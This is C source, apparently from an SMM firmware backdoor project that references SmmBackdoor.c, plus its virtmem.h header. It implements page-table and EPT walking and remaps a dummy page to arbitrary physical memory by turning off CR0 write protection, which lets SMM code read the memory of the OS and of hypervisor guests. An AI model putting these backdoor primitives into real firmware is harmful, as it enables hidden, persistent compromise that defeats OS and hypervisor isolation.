#else

#define DbgMsgMem

#endif

// defined in SmmBackdoor.c
extern UINT64 m_DummyPage;
//--------------------------------------------------------------------------------------
BOOLEAN VirtualAddrRemap(UINT64 Addr, UINT64 NewAddr, UINT64 Cr3, BOOLEAN *pbLargePage)
{
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    
    PML4Entry.Uint64 = *(UINT64 *)(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));

    if (PML4Entry.Bits.Present)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;
        PDPTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
                                       PDPT_INDEX(Addr) * sizeof(UINT64));

        if (PDPTEntry.Bits.Present)
        {
            // check for page size flag
            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K *PDEntry = (X64_PAGE_DIRECTORY_ENTRY_4K *)
                    (PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) + PDE_INDEX(Addr) * sizeof(UINT64));

                if (PDEntry->Bits.Present)
                {
                    // check for page size flag
                    if ((PDEntry->Uint64 & PDPTE_PDE_PS) == 0)
                    {                        
                        X64_PAGE_TABLE_ENTRY_4K *PTEntry = (X64_PAGE_TABLE_ENTRY_4K *)
                            (PFN_TO_PAGE(PDEntry->Bits.PageTableBaseAddress) + PTE_INDEX(Addr) * sizeof(UINT64));

                        if (PTEntry->Bits.Present)
                        {
                            UINT64 Cr0 = __readcr0();

                            // disable write protection
                            __writecr0(Cr0 & ~CR0_WP);

                            // remap virtual address to the new physical address
                            PTEntry->Bits.PageTableBaseAddress = PAGE_TO_PFN(NewAddr & ~(PAGE_SIZE - 1));                                                        

                            // restore write protection
                            __writecr0(Cr0);

                            // flush TLB
                            __writecr3(__readcr3());

                            if (pbLargePage)
                            {
                                // 4K page
                                *pbLargePage = FALSE;
                            }
                            
                            return TRUE;
                        }
                    }
                    else
                    {
                        UINT64 Cr0 = __readcr0();
                        
                        // disable write protection
                        __writecr0(Cr0 & ~CR0_WP);

                        // remap virtual address to the new physical address
                        PDEntry->Bits.PageTableBaseAddress = PAGE_TO_PFN(NewAddr & ~(PAGE_SIZE_2M - 1));                                                        

                        // restore write protection
                        __writecr0(Cr0);

                        // flush TLB
                        __writecr3(__readcr3());

                        if (pbLargePage)
                        {
                            // 2M page
                            *pbLargePage = TRUE;
                        }
                        
                        return TRUE;
                    }
                }  
            }
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
EFI_STATUS PhysicalToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Eptp, UINT64 SmmCr3)
{
    UINT64 PhysAddr = 0;
    EFI_STATUS Status = EFI_INVALID_PARAMETER;    
    BOOLEAN bLargePage = FALSE;

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    

    DbgMsgMem(__FILE__, __LINE__, __FUNCTION__"(): EPTP is 0x%llx, GPA is 0x%llx\r\n", Eptp, Addr);

    // map physical memory page at dummy virtual page
    #define PHYS_MAP(_addr_) VirtualAddrRemap(m_DummyPage, (_addr_), SmmCr3, &bLargePage)

    // restore mappings
    #define PHYS_REVERT() VirtualAddrRemap(m_DummyPage, m_DummyPage, SmmCr3, &bLargePage)

    // get mapped virtual address
    #define MAPPED_ADDR(_addr_) (m_DummyPage + (bLargePage ? PAGE_OFFSET_2M((_addr_)) : \
                                                             PAGE_OFFSET_4K((_addr_))))

    if (SmmCr3 != 0)
    {
        UINT64 ReadAddr = PML4_ADDRESS(Eptp);

        // map physical address
        if (PHYS_MAP(ReadAddr))
        {
            UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

            PML4Entry.Uint64 = *(UINT64 *)(TargetAddr + PML4_INDEX(Addr) * sizeof(UINT64));       

            // revert old mapping
            PHYS_REVERT();
        } 
        else
        {
            return Status;
        }
    }
    else
    {
        PML4Entry.Uint64 = *(UINT64 *)(PML4_ADDRESS(Eptp) + PML4_INDEX(Addr) * sizeof(UINT64));
    }

    DbgMsgMem(
        __FILE__, __LINE__, 
        "EPT PML4E is at 0x%llx[0x%llx]: 0x%llx\r\n", 
        PML4_ADDRESS(Eptp), PML4_INDEX(Addr), PML4Entry.Uint64
    );

    if (EPT_PRESENT(PML4Entry.Uint64))
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;

        if (SmmCr3 != 0)
        {
            UINT64 ReadAddr = PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress);

            // map physical address
            if (PHYS_MAP(ReadAddr))
            {
                UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

                PDPTEntry.Uint64 = *(UINT64 *)(TargetAddr + PDPT_INDEX(Addr) * sizeof(UINT64));

                // revert old mapping
                PHYS_REVERT();
            } 
            else
            {
                return Status;
            }
        }
        else
        {
            PDPTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
                                           PDPT_INDEX(Addr) * sizeof(UINT64));
        }

        DbgMsgMem(
            __FILE__, __LINE__, 
            "EPT PDPTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
            PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress), PDPT_INDEX(Addr), PDPTEntry.Uint64
        );

        if (EPT_PRESENT(PDPTEntry.Uint64))
        {
            // check for page size flag
            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;

                if (SmmCr3 != 0)
                {
                    UINT64 ReadAddr = PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress);

                    // map physical address
                    if (PHYS_MAP(ReadAddr))
                    {
                        UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

                        PDEntry.Uint64 = *(UINT64 *)(TargetAddr + PDE_INDEX(Addr) * sizeof(UINT64));       

                        // revert old mapping
                        PHYS_REVERT();
                    } 
                    else
                    {
                        return Status;
                    }
                }
                else
                {
                    PDEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                                                 PDE_INDEX(Addr) * sizeof(UINT64));
                }

                DbgMsgMem(
                    __FILE__, __LINE__, 
                    "EPT PDE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
                    PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress), PDE_INDEX(Addr), PDEntry.Uint64
                );

                if (EPT_PRESENT(PDEntry.Uint64))
                {
                    // check for page size flag
                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K PTEntry;

                        if (SmmCr3 != 0)
                        {
                            UINT64 ReadAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress);

                            // map physical address
                            if (PHYS_MAP(ReadAddr))
                            {
                                UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

                                PTEntry.Uint64 = *(UINT64 *)(TargetAddr + PTE_INDEX(Addr) * sizeof(UINT64));

                                // revert old mapping
                                PHYS_REVERT();
                            } 
                            else
                            {
                                return Status;
                            }
                        }
                        else
                        {
                            PTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                                         PTE_INDEX(Addr) * sizeof(UINT64));
                        }

                        DbgMsgMem(
                            __FILE__, __LINE__, 
                            "EPT PTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
                            PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress), PTE_INDEX(Addr), PTEntry.Uint64
                        );

                        if (EPT_PRESENT(PTEntry.Uint64))
                        {
                            PhysAddr = PFN_TO_PAGE(PTEntry.Bits.PageTableBaseAddress) +
                                       PAGE_OFFSET_4K(Addr);

                            Status = EFI_SUCCESS;
                        }
                        else
                        {
                            DbgMsg(
                                __FILE__, __LINE__, 
                                "ERROR: EPT PTE for 0x%llx is not present\r\n", Addr
                            );
                        }
                    }
                    else
                    {
                        PhysAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                   PAGE_OFFSET_2M(Addr);

                        Status = EFI_SUCCESS;
                    }
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: EPT PDE for 0x%llx is not present\r\n", Addr
                    );
                }                     
            }
            else
            {
                PhysAddr = PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                           PAGE_OFFSET_1G(Addr);

                Status = EFI_SUCCESS;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: EPT PDPTE for 0x%llx is not present\r\n", Addr);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: EPT PML4E for 0x%llx is not present\r\n", Addr);
    }

    if (Status == EFI_SUCCESS)
    {
        if (Ret)
        {            
            *Ret = PhysAddr;
        }
    }

    return Status;
}
//--------------------------------------------------------------------------------------
EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3, UINT64 Eptp, UINT64 SmmCr3)
{
    UINT64 PhysAddr = 0;
    EFI_STATUS Status = EFI_INVALID_PARAMETER;    
    BOOLEAN bLargePage = FALSE;

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    

    DbgMsgMem(__FILE__, __LINE__, __FUNCTION__"(): CR3 is 0x%llx, VA is 0x%llx\r\n", Cr3, Addr);

    // map physical memory page at dummy virtual page
    #define PHYS_MAP(_addr_) VirtualAddrRemap(m_DummyPage, (_addr_), SmmCr3, &bLargePage)

    // restore mappings
    #define PHYS_REVERT() VirtualAddrRemap(m_DummyPage, m_DummyPage, SmmCr3, &bLargePage)

    // get mapped virtual address
    #define MAPPED_ADDR(_addr_) (m_DummyPage + (bLargePage ? PAGE_OFFSET_2M((_addr_)) : \
                                                             PAGE_OFFSET_4K((_addr_))))

    if (SmmCr3 != 0)
    {
        UINT64 ReadAddr = PML4_ADDRESS(Cr3);

        if (Eptp != 0)
        {
            // convert guest physical address to host physical address
            if (PhysicalToPhysical(ReadAddr, &ReadAddr, Eptp, SmmCr3) != EFI_SUCCESS)
            {
                return Status;
            }
        }

        // map physical address
        if (PHYS_MAP(ReadAddr))
        {
            UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

            PML4Entry.Uint64 = *(UINT64 *)(TargetAddr + PML4_INDEX(Addr) * sizeof(UINT64));       

            // revert old mapping
            PHYS_REVERT();
        } 
        else
        {
            return Status;
        }
    }
    else
    {
        PML4Entry.Uint64 = *(UINT64 *)(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));
    }

    DbgMsgMem(
        __FILE__, __LINE__, 
        "PML4E is at 0x%llx[0x%llx]: 0x%llx\r\n", 
        PML4_ADDRESS(Cr3), PML4_INDEX(Addr), PML4Entry.Uint64
    );

    if (PML4Entry.Bits.Present)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;

        if (SmmCr3 != 0)
        {
            UINT64 ReadAddr = PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress);

            if (Eptp != 0)
            {
                // convert guest physical address to host physical address
                if (PhysicalToPhysical(ReadAddr, &ReadAddr, Eptp, SmmCr3) != EFI_SUCCESS)
                {
                    return Status;
                }
            }

            // map physical address
            if (PHYS_MAP(ReadAddr))
            {
                UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

                PDPTEntry.Uint64 = *(UINT64 *)(TargetAddr + PDPT_INDEX(Addr) * sizeof(UINT64));

                // revert old mapping
                PHYS_REVERT();
            } 
            else
            {
                return Status;
            }
        }
        else
        {
            PDPTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
                                           PDPT_INDEX(Addr) * sizeof(UINT64));
        }

        DbgMsgMem(
            __FILE__, __LINE__, 
            "PDPTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
            PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress), PDPT_INDEX(Addr), PDPTEntry.Uint64
        );

        if (PDPTEntry.Bits.Present)
        {
            // check for page size flag
            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;

                if (SmmCr3 != 0)
                {
                    UINT64 ReadAddr = PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress);

                    if (Eptp != 0)
                    {
                        // convert guest physical address to host physical address
                        if (PhysicalToPhysical(ReadAddr, &ReadAddr, Eptp, SmmCr3) != EFI_SUCCESS)
                        {
                            return Status;
                        }
                    }

                    // map physical address
                    if (PHYS_MAP(ReadAddr))
                    {
                        UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

                        PDEntry.Uint64 = *(UINT64 *)(TargetAddr + PDE_INDEX(Addr) * sizeof(UINT64));       

                        // revert old mapping
                        PHYS_REVERT();
                    } 
                    else
                    {
                        return Status;
                    }
                }
                else
                {
                    PDEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                                                 PDE_INDEX(Addr) * sizeof(UINT64));
                }

                DbgMsgMem(
                    __FILE__, __LINE__, 
                    "PDE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
                    PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress), PDE_INDEX(Addr), PDEntry.Uint64
                );

                if (PDEntry.Bits.Present)
                {
                    // check for page size flag
                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K PTEntry;

                        if (SmmCr3 != 0)
                        {
                            UINT64 ReadAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress);

                            if (Eptp != 0)
                            {
                                // convert guest physical address to host physical address
                                if (PhysicalToPhysical(ReadAddr, &ReadAddr, Eptp, SmmCr3) != EFI_SUCCESS)
                                {
                                    return Status;
                                }
                            }

                            // map physical address
                            if (PHYS_MAP(ReadAddr))
                            {
                                UINT64 TargetAddr = MAPPED_ADDR(ReadAddr);

                                PTEntry.Uint64 = *(UINT64 *)(TargetAddr + PTE_INDEX(Addr) * sizeof(UINT64));

                                // revert old mapping
                                PHYS_REVERT();
                            } 
                            else
                            {
                                return Status;
                            }
                        }
                        else
                        {
                            PTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                                         PTE_INDEX(Addr) * sizeof(UINT64));
                        }

                        DbgMsgMem(
                            __FILE__, __LINE__, 
                            "PTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
                            PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress), PTE_INDEX(Addr), PTEntry.Uint64
                        );

                        if (PTEntry.Bits.Present)
                        {
                            PhysAddr = PFN_TO_PAGE(PTEntry.Bits.PageTableBaseAddress) +
                                       PAGE_OFFSET_4K(Addr);

                            Status = EFI_SUCCESS;
                        }
                        else
                        {
                            DbgMsg(
                                __FILE__, __LINE__, 
                                "ERROR: PTE for 0x%llx is not present\r\n", Addr
                            );
                        }
                    }
                    else
                    {
                        PhysAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                   PAGE_OFFSET_2M(Addr);

                        Status = EFI_SUCCESS;
                    }
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: PDE for 0x%llx is not present\r\n", Addr
                    );
                }                     
            }
            else
            {
                PhysAddr = PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                           PAGE_OFFSET_1G(Addr);

                Status = EFI_SUCCESS;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: PDPTE for 0x%llx is not present\r\n", Addr);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: PML4E for 0x%llx is not present\r\n", Addr);
    }

    if (Status == EFI_SUCCESS)
    {
        if (Eptp != 0)
        {
            // convert guest physical address to host physical address
            if (PhysicalToPhysical(PhysAddr, &PhysAddr, Eptp, SmmCr3) != EFI_SUCCESS)
            {
                return Status;
            }
        }

        DbgMsg(__FILE__, __LINE__, "Physical address of 0x%llx is 0x%llx\r\n", Addr, PhysAddr);

        if (Ret)
        {            
            *Ret = PhysAddr;
        }
    }

    return Status;
}
//--------------------------------------------------------------------------------------
BOOLEAN VirtualAddrValid(UINT64 Addr, UINT64 Cr3)
{
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    
    PML4Entry.Uint64 = *(UINT64 *)(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));

    if (PML4Entry.Bits.Present)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;
        PDPTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
                                       PDPT_INDEX(Addr) * sizeof(UINT64));

        if (PDPTEntry.Bits.Present)
        {
            // check for page size flag
            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;
                PDEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                                             PDE_INDEX(Addr) * sizeof(UINT64));

                if (PDEntry.Bits.Present)
                {
                    // check for page size flag
                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K PTEntry;
                        PTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                                     PTE_INDEX(Addr) * sizeof(UINT64));
                        if (PTEntry.Bits.Present)
                        {                            
                            return TRUE;
                        }
                    }
                    else
                    {
                        return TRUE;
                    }
                }  
            }
            else
            {
                return TRUE;
            }
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOLEAN Check_IA_32e(void)
{
    UINT64 Cr0 = __readcr0();
    UINT64 Efer = __readmsr(IA32_EFER);

    // check for the paging enabled
    if (!(Cr0 & CR0_PG))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: CR0.PG is not set\r\n");
        return FALSE;   
    }

    // check for the 64-bit mode enabled
    if (!(Efer & IA32_EFER_LME))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: IA32_EFER.LME is not set\r\n");
        return FALSE;
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
// EoF

```

`src/virtmem.h`:

```h

#ifndef _VIRTMEM_H_
#define _VIRTMEM_H_

// PS flag of PDPTE and PDE
#define PDPTE_PDE_PS 0x80

#define PFN_TO_PAGE(_val_) ((_val_) << PAGE_SHIFT)
#define PAGE_TO_PFN(_val_) ((_val_) >> PAGE_SHIFT)

// get MPL4 address from CR3 register value
#define PML4_ADDRESS(_val_) ((_val_) & 0xfffffffffffff000)

// get address translation indexes from virtual address
#define PML4_INDEX(_addr_) (((_addr_) >> 39) & 0x1ff)
#define PDPT_INDEX(_addr_) (((_addr_) >> 30) & 0x1ff)
#define PDE_INDEX(_addr_) (((_addr_) >> 21) & 0x1ff)
#define PTE_INDEX(_addr_) (((_addr_) >> 12) & 0x1ff)

#define PAGE_OFFSET_4K(_addr_) ((_addr_) & 0xfff)
#define PAGE_OFFSET_2M(_addr_) ((_addr_) & 0x1fffff)
#define PAGE_OFFSET_1G(_addr_) ((_addr_) & 0x3fffffff)


// EPT present bit
#define EPT_PRESENT(_val_) (((_val_) & 7) != 0)

// EPT permission flags
#define EPT_R(_val_) (((_val_) & 1) == 1)
#define EPT_W(_val_) (((_val_) & 2) == 2)
#define EPT_X(_val_) (((_val_) & 4) == 4)


typedef struct _CONTROL_REGS
{
    UINT64 Cr0, Cr3, Cr4;

} CONTROL_REGS,
*PCONTROL_REGS;


BOOLEAN Check_IA_32e(void);
BOOLEAN VirtualAddrValid(UINT64 Addr, UINT64 Cr3);
EFI_STATUS PhysicalToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Eptp, UINT64 SmmCr3);
EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3, UINT64 Eptp, UINT64 SmmCr3);
BOOLEAN VirtualAddrRemap(UINT64 Addr, UINT64 NewAddr, UINT64 Cr3, BOOLEAN *pbLargePage);

#endif

```